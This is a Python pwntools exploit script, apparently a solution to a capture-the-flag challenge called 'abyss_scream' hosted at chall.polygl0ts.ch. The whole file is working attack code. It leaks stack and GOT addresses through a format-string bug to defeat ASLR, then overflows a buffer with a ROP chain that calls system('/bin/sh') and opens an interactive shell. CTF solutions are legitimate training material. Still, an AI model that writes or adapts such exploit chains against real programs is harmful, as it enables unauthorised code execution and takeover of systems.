#!/usr/bin/env python3

from pwn import *

file = ELF("./abyss_scream")
libc = ELF("./libc.so.6")

context.binary = file
context.terminal = ["kitty"]
script = """
c
"""

def conn():
    if args.GDB:
        p = gdb.debug(file, gdbscript=script)
    elif args.REMOTE:
        p = remote("chall.polygl0ts.ch", 9001)
    else:
        p = process(file)
    return p

def msg(name: bytes, message: bytes) -> bytes:
    p.sendlineafter(b": ", b"x")
    p.sendlineafter(b": ", name)
    p.sendlineafter(b": ", message)
    p.recvuntil(b"message:\n")
    return p.recvline()

def leaks():
    spam = b"%p."
    addrs = msg("meh", spam * (0x108 // len(spam)))
    addrs = addrs.strip().strip(b".")
    addrs = addrs.split(b".")
    for i in range(len(addrs)):
        if b"(nil)" in addrs[i]:
            addrs[i] = 0
        else:
            addrs[i] = int(addrs[i], 16)
    return addrs

def read(addr):
    payload =  b""
    payload += b"%17$s"
    payload =  payload.ljust(9 * 8, b"\x00")
    payload += p64(addr)
    r = msg(b"meh", payload)[:-1]
    return r

p = conn()

addrs = leaks()
leak = next(filter(lambda n: n & 0xfff == 0x39e, addrs))
filebase = leak - 0x139e

log.info(f"leak: 0x{leak:x}")
log.info(f"filebase: 0x{filebase:x}")

leak = u64(read(filebase + file.got.system).ljust(8, b"\x00"))
libcbase = leak - libc.sym.system
log.info(f"leak: 0x{leak:x}")
log.info(f"libcbase: 0x{libcbase:x}")

poprdi = p64(libcbase + 0x000000000002a3e5)
system = p64(filebase + file.plt.system)
shell  = p64(libcbase + next(libc.search(b"/bin/sh\x00")))
ret    = p64(libcbase + 0x0000000000029139)

payload =  b""
payload =  payload.ljust(0x118, b"\x00")
payload += poprdi
payload += shell
payload += ret
payload += system

p.sendlineafter(b": ", b"x")
p.sendlineafter(b": ", b"meh")
p.sendlineafter(b": ", payload)

p.interactive()